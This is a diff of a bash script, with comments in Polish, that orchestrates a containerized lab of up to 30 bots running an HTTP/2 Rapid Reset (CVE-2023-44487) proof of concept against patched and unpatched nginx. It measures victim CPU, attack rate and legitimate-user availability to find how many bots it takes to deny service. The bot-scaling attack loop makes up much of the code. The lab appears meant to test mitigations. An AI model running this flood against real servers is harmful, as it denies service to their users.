@@ -1,30 +1,40 @@
 #!/usr/bin/env bash
 # =============================================================================
-# Botnet vs nginx — matryca obciążenia (CVE-2023-44487 HTTP/2 Rapid Reset)
+# Botnet vs nginx — matryca "ILE BOTÓW TRZEBA" (CVE-2023-44487 HTTP/2 Rapid Reset)
 # =============================================================================
-# Mierzy obciążenie CPU serwera-ofiary w funkcji ROZMIARU BOTNETU (1..5)
-# dla 4 konfiguracji serwera:
+# Pyta o rzecz, która ma wartość: ILE BOTÓW / JAKI AGREGATOWY RPS trzeba, żeby
+# serwer przestał obsługiwać PRAWDZIWYCH użytkowników. Dla każdej pary
+# (konfiguracja serwera × rozmiar botnetu) mierzy JEDNOCZEŚNIE trzy rzeczy:
+#
+#   [A] SIŁA OGNIA ATAKUJĄCEGO — zagregowany RST_STREAM/s i HEADERS/s z całej
+#       floty (ile "strumieni na sekundę" generuje N botów).
+#   [B] WPŁYW NA OFIARĘ        — CPU% ofiary + liczba aktywnych połączeń.
+#   [C] DOSTĘPNOŚĆ DLA USERA   — równoległa sonda legalnego klienta (h2load, 2
+#       połączenia): ile żądań 2xx się udaje, ile req/s, ile błędów.
+#       SPADEK [C] = atak skuteczny. To jest "próg", którego szukamy.
+#
+# 4 konfiguracje serwera-ofiary:
 #     old/normal   — nienałatany nginx 1.25.1, bez hardeningu
 #     old/hardened — nienałatany nginx 1.25.1 + rate-limiting per-IP
-#     new/normal   — załatany nginx 1.27,   bez hardeningu
+#     new/normal   — załatany nginx 1.27,   bez hardeningu   (łatka Rapid Reset)
 #     new/hardened — załatany nginx 1.27   + rate-limiting per-IP
-#
 # Każdy bot = osobny kontener = OSOBNE IP (prawdziwy ruch rozproszony).
-# Atak = PoC rapidreset (HEADERS + natychmiastowy RST_STREAM w pętli).
-# CPU ofiary = delta cgroup usage_usec / czas okna, uśrednione z 3 okien.
 #
 # WYMAGANIA (uruchom najpierw w katalogu repo):
-#     docker compose up -d --build          # podnosi sieć labnet + loadgen + bot(obraz)
-# Sieć i obrazy mają stałe nazwy (compose: name=ddos-lab), więc działa na każdej maszynie.
+#     docker compose up -d --build        # sieć labnet + loadgen(h2load) + obraz bota
 #
-# PARAMETRY (zmienne środowiskowe — na mocniejszym CPU podnieś BOT_CPUS/CONC):
-#     BOT_CPUS=0.8   limit CPU na bota (na 4-rdzeniowym hoście ~0.4; na mocnym 1.0+)
-#     VIC_CPUS=1.0   limit CPU ofiary (ile rdzeni może zająć serwer)
-#     CONC=400       liczba równoczesnych strumieni na jedno uderzenie bota
-#     SIZES="1 2 3 4 5"   rozmiary botnetu do przejścia
-#     OUTDIR=...      gdzie zapisać wyniki (domyślnie lab-results/data)
+# PARAMETRY (zmienne środowiskowe):
+#     SIZES="1 5 10 20 30"  rozmiary botnetu do przejścia
+#     BOT_CPUS=1.0   limit CPU na bota   (mocny PC: 1.0+; słaby: 0.4)
+#     VIC_CPUS=2.0   limit CPU ofiary    (ile rdzeni może zająć serwer)
+#     CONC=800       strumieni na jedno uderzenie bota (siła na bota)
+#     OUTDIR=...     gdzie zapisać wyniki (domyślnie lab-results/data)
 #
-# Przykład na mocnej maszynie:  BOT_CPUS=1.0 VIC_CPUS=2.0 CONC=800 ./run-botnet-matrix.sh
+# UWAGA PAMIĘĆ: 30 botów + ofiara + loadgen to ~32 kontenery. Wymaga mocnej
+#   maszyny (rdzenie + RAM). Na 4-rdzeniowym/8GB hoście użyj SIZES="1 2 3".
+#
+# Przykład (mocny PC): SIZES="1 5 10 20 30" BOT_CPUS=1.0 VIC_CPUS=2.0 CONC=800 \
+#                      bash lab-results/scripts/run-botnet-matrix.sh
 # =============================================================================
 set -u
 export MSYS_NO_PATHCONV=1 2>/dev/null || true   # Git Bash na Windows: nie psuj ścieżek
@@ -36,19 +46,27 @@ CSV="$OUTDIR/botnet.csv"; TL="$OUTDIR/botnet_timeline.txt"
 
 NETWORK="${NETWORK:-ddos-lab_labnet}"
 BOT_IMAGE="${BOT_IMAGE:-ddos-lab-bot}"          # obraz bota zbudowany przez compose
-LOADGEN="${LOADGEN:-lab-loadgen}"               # kontener z curl (do stub_status)
-BOT_CPUS="${BOT_CPUS:-0.8}"; VIC_CPUS="${VIC_CPUS:-1.0}"
-CONC="${CONC:-400}"; REQ="${REQ:-2000}"
-SIZES="${SIZES:-1 2 3 4 5}"
-WARM=3; WIN=5; NWIN=3; GAP=4
-DUR=$((WARM + WIN*NWIN + 2))
+LOADGEN="${LOADGEN:-lab-loadgen}"               # kontener z h2load + curl
+BOT_CPUS="${BOT_CPUS:-1.0}"; VIC_CPUS="${VIC_CPUS:-2.0}"
+CONC="${CONC:-800}"; REQ="${REQ:-20000}"
+SIZES="${SIZES:-1 5 10 20 30}"
+WARM=3; WIN=5; NWIN=3; GAP=5
+LEGWIN=$((WIN*NWIN))                             # okno sondy legalnego klienta
+DUR=$((WARM + LEGWIN + 4))                       # jak długo leci atak (obejmuje sondę)
 NMAX=0; for s in $SIZES; do [ "$s" -gt "$NMAX" ] && NMAX=$s; done
 
 log(){ echo "$(date '+%H:%M:%S') | $*" | tee -a "$TL"; }
 cpu_usec(){ timeout 6 docker exec lab-victim2 sh -c 'awk "/usage_usec/{print \$2}" /sys/fs/cgroup/cpu.stat' 2>/dev/null; }
 active(){ timeout 6 docker exec "$LOADGEN" sh -c 'curl -sk --max-time 4 https://victim/status 2>/dev/null' | awk '/Active/{print $3}'; }
-storm(){ local n=$1 dur=$2 b; for b in $(seq 1 $n); do docker exec -d lab-bot$b sh -c 'end=$(( $(date +%s)+'"$dur"' )); while [ $(date +%s) -lt $end ]; do rapidreset -url https://victim:443 -requests '"$REQ"' -concurrency '"$CONC"' >/dev/null 2>&1; done' 2>/dev/null; done; }
+
+# --- atak: każdy bot w pętli do deadline, KAŻDĄ rundę loguje summary do /tmp/rr.log ---
+storm(){ local n=$1 dur=$2 b
+  for b in $(seq 1 $n); do
+    docker exec -d lab-bot$b sh -c 'rm -f /tmp/rr.log; end=$(( $(date +%s)+'"$dur"' )); while [ $(date +%s) -lt $end ]; do rapidreset -url https://victim:443 -requests '"$REQ"' -concurrency '"$CONC"' >> /tmp/rr.log 2>&1; done' 2>/dev/null
+  done; }
 stopb(){ local n=$1 b; for b in $(seq 1 $n); do docker exec lab-bot$b pkill rapidreset 2>/dev/null; done; }
+# zsumuj RST_STREAM (lub HEADERS) ze wszystkich rund bota: pole "KEY=NNN"
+botsum(){ local b=$1 key=$2; timeout 6 docker exec lab-bot$b sh -c "awk -F'$key=' 'NF>1{split(\$2,a,\" \"); s+=a[1]} END{print s+0}' /tmp/rr.log 2>/dev/null"; }
 
 # --- 0. sanity: sieć istnieje? ---
 docker network inspect "$NETWORK" >/dev/null 2>&1 || { echo "BŁĄD: brak sieci $NETWORK — uruchom najpierw: docker compose up -d --build"; exit 1; }
@@ -65,27 +83,54 @@ for i in $(seq 1 $NMAX); do
   docker run -d --name lab-bot$i --cpus="$BOT_CPUS" --network "$NETWORK" "$BOT_IMAGE" >/dev/null
 done
 
-echo "config,ver,hard,size,cpu_pct,active" > "$CSV"
+# CSV: pełny obraz "ile botów trzeba"
+echo "config,ver,hard,size,cpu_pct,active,atk_rst_s,atk_hdr_s,legit_rps,legit_2xx,legit_fail,legit_ok_pct" > "$CSV"
 
 run_config(){ # ver mode
-  local VER=$1 MODE=$2 IMG="labvic:$1" N w u0 u1 t0 t1 cw sum k acc cpu i
+  local VER=$1 MODE=$2 IMG="labvic:$1" N w u0 u1 t0 t1 cw sum k acc cpu i b
   docker rm -f lab-victim2 >/dev/null 2>&1
   docker run -d --name lab-victim2 --network "$NETWORK" --network-alias victim --cpus="$VIC_CPUS" -e MODE=$MODE "$IMG" >/dev/null
   log "=== CONFIG $VER/$MODE ==="
   i=0; while [ $i -lt 20 ]; do timeout 4 docker exec "$LOADGEN" sh -c 'curl -sk --max-time 3 https://victim/status >/dev/null 2>&1' && break; i=$((i+1)); sleep 1; done
-  storm 2 6; sleep 6; stopb 2; sleep 3           # pre-warm (odrzucone)
+
+  # baseline legalnego klienta BEZ ataku (żeby było z czym porównać "ok_pct")
+  docker exec "$LOADGEN" sh -c "h2load -c 2 -m 10 --duration=4 https://victim:443/ 2>/dev/null | awk '/finished in/{print \$3} /status codes/{print}'" >/dev/null 2>&1
+
   for N in $SIZES; do
     storm $N $DUR; sleep $WARM
+    # sonda legalnego klienta startuje RÓWNOLEGLE z atakiem, na całe okno pomiaru
+    docker exec -d "$LOADGEN" sh -c "h2load -c 2 -m 10 --duration=$LEGWIN https://victim:443/ > /tmp/legit.out 2>&1"
+    # pomiar CPU w NWIN oknach
     sum=0; k=0; acc=0
     for w in $(seq 1 $NWIN); do
       u0=$(cpu_usec); t0=$(date +%s%N); sleep $WIN; u1=$(cpu_usec); t1=$(date +%s%N)
       [ $w -eq 2 ] && acc=$(active)
       if [ -n "$u0" ] && [ -n "$u1" ]; then cw=$(awk "BEGIN{printf \"%.2f\",($u1-$u0)/(($t1-$t0)/1000)*100}"); sum=$(awk "BEGIN{print $sum+$cw}"); k=$((k+1)); fi
     done
+    sleep 2                                       # pozwól sondzie się domknąć
     stopb $N
     cpu=$(awk "BEGIN{if($k>0)printf \"%.1f\",$sum/$k; else print \"NA\"}")
-    echo "$VER/$MODE,$VER,$MODE,$N,$cpu,${acc:-0}" >> "$CSV"
-    log "size=$N -> CPU=${cpu}% active=${acc:-0}"
+
+    # [A] siła ognia atakującego: suma po flocie / czas trwania ataku
+    trst=0; thdr=0
+    for b in $(seq 1 $N); do
+      vr=$(botsum $b RST_STREAM); vr=$(echo "$vr" | tr -dc '0-9'); trst=$(( trst + ${vr:-0} ))
+      vh=$(botsum $b HEADERS);    vh=$(echo "$vh" | tr -dc '0-9'); thdr=$(( thdr + ${vh:-0} ))
+    done
+    rst_s=$(awk "BEGIN{printf \"%.0f\", $trst/$DUR}")
+    hdr_s=$(awk "BEGIN{printf \"%.0f\", $thdr/$DUR}")
+
+    # [C] dostępność dla legalnego usera (podczas ataku)
+    LG=$(timeout 6 docker exec "$LOADGEN" sh -c 'cat /tmp/legit.out 2>/dev/null')
+    lrps=$(echo "$LG" | awk -F'[, ]+' '/finished in/{for(i=1;i<=NF;i++) if($i=="req/s,"||$i=="req/s") print $(i-1)}' | head -1)
+    l2xx=$(echo "$LG" | awk -F'[ ,]+' '/status codes/{print $3}')
+    ltot=$(echo "$LG" | awk -F'[ ,]+' '/requests:/{print $2}')
+    lok=$(echo "$LG"  | awk -F'[ ,]+' '/requests:/{for(i=1;i<=NF;i++) if($i=="succeeded") print $(i-1)}')
+    lfail=$(echo "$LG"| awk -F'[ ,]+' '/requests:/{for(i=1;i<=NF;i++) if($i=="failed") print $(i-1)}')
+    okpct=$(awk "BEGIN{if(\"$ltot\"+0>0) printf \"%.0f\",(\"$lok\"+0)/(\"$ltot\"+0)*100; else print \"NA\"}")
+
+    echo "$VER/$MODE,$VER,$MODE,$N,$cpu,${acc:-0},$rst_s,$hdr_s,${lrps:-0},${l2xx:-0},${lfail:-0},$okpct" >> "$CSV"
+    log "size=$N -> CPU=${cpu}% active=${acc:-0} | atak: ${rst_s} RST/s, ${hdr_s} HEADERS/s | legalny user: ${lrps:-0} req/s, ${okpct}% OK (${lfail:-0} błędów)"
     sleep $GAP
   done
 }
@@ -96,8 +141,9 @@ run_config new normal
 run_config new hardened
 
 log "MATRYCA GOTOWA -> $CSV"
-echo; echo "=== WYNIK (CPU% ofiary wg rozmiaru botnetu) ==="
-awk -F, 'NR>1{d[$1","$4]=$5; seen[$1]=1} END{printf "%-14s  s1     s2     s3     s4     s5\n","config"; for(k in seen){printf "%-14s",k; for(n=1;n<=5;n++)printf " %6s",d[k","n]; print ""}}' "$CSV" | sort
+echo; echo "=== WYNIK: ile botów trzeba (CPU ofiary / siła ataku / dostępność usera) ==="
+awk -F, 'NR==1{next}
+  {printf "%-14s size=%-3s  CPU=%5s%%  atak=%9s RST/s  user=%6s req/s  OK=%4s%%\n",$1,$4,$5,$7,$9,$12}' "$CSV"
 
 # sprzątanie floty/ofiary (zostaw bazowy lab)
 for i in $(seq 1 $NMAX); do docker rm -f lab-bot$i >/dev/null 2>&1; done
